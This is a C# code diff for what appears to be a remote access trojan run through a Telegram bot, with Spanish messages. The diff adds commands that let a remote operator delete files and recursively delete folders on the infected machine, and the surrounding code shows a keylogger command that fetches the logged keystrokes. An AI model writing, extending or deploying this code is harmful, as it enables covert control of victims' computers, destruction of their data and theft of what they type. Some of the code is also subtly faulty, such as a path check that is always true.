@@ -200,30 +200,35 @@ namespace RAT_BotTelegram {
                     }
                     Path = "";
                     break;
+                case "/Delete_OnlyFile":
+                    if (Path.Length <= 4) {
+                        SendBotMessage("Ejemplo de comando\n /Delete_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Delete_OnlyFile D:\\Documentos\\Monografía.docx");
+                    } else {
+                        if (Delete(Path)) {
+                            SendBotMessage($"Se eliminó  el archivo: {Path} \nCorrectamente");
+                        } else {
+                            SendBotMessage($"No se pudo eliminar el archivo: {Path} ");
+                        }
+                    }
+                    Path = "";
+                    break;
                 #endregion
 
                 case "/Keylogger":
                     Path = config.PATH_LOG+"\\"+config.LOG; // Path del archivo log del keylogger
-                    if (Path.Length <= 4) {
-                        SendBotMessage("Ejemplo de comando\n ");
-                    } else {
-                        GetOnlyFileTelegram(Path);
-                    }
+                    
                     Path = "";
                     break;
-                case "/Delete_OnlyFile":
-                    if (Path.Length <= 4) {
-                        SendBotMessage("Ejemplo de comando\n ");
-                    } else {
-                        GetOnlyFileTelegram(Path);
-                    }
-                    Path = "";
-                    break;
+                
                 case "/Delete_Folder":
                     if (Path.Length <= 4) {
-                        SendBotMessage("Ejemplo de comando\n ");
+                        SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
                     } else {
-                        GetOnlyFileTelegram(Path);
+                        if (Delete(Path,true)) {
+                            SendBotMessage($"Se eliminó la Carpeta: {Path} \nCorrectamente");
+                        } else {
+                            SendBotMessage($"No se pudo eliminar la Carpeta: {Path} ");
+                        }
                     }
                     Path = "";
                     break;
@@ -292,7 +297,40 @@ namespace RAT_BotTelegram {
                 return true;    // No supera los 10Mb
             }
         }
+        private static bool Delete(string Path, bool folder = false) {
+            if (Path != "" || Path != "[-]") {
+                try {
+                    if (!folder) {
+                        File.Delete(Path);
+                        if (File.Exists(Path)) {
+                            Console.WriteLine("El archivo sigue existiendo.");
+                            return false;
+                        } else {
+                            Console.WriteLine("El archivo ya no existe.");
+                            return true;
+                        }
+                    } else {
+                        Directory.Delete(Path, true);
+                        //if (Directory.Exists(Path)) {
+                        //    Console.WriteLine("No se pudo eliminar la carpeta");
+                        //    return false;
+                        //} else {
+                        //    Console.WriteLine("Se eliminó la carpeta correctamente");
+                            return true;
 
+                        //}
+                    }   
+                } catch {
+                    return false;
+                }
+            } else {
+                Console.WriteLine("La ruta ingresada está vacía");
+                return false;
+            }
+           
+
+            
+        }
         private async static void GetOnlyFileTelegram(string file) {
             if (file != "") {
                 try {
